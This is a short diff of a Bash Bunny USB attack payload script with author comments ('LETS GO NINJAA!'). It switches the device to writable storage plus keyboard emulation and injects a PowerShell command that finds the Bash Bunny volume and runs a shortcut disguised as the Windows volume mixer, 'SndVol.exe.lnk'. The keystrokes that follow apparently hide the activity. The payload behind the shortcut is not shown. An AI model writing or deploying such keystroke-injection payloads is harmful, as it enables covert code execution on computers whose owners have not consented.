@@ -1,7 +1,12 @@
+# Author: Rinilyn
+# Uses: Read that readme for uses.
+
+
+# LETS GO NINJAA!
 LED SETUP
-ATTACKMODE HID RO_STORAGE
+ATTACKMODE HID STORAGE
+# Running the shortcut
 RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\SndVol.exe.lnk')"
-LED STAGE2
 Q END
 Q F11
 LED FINISH
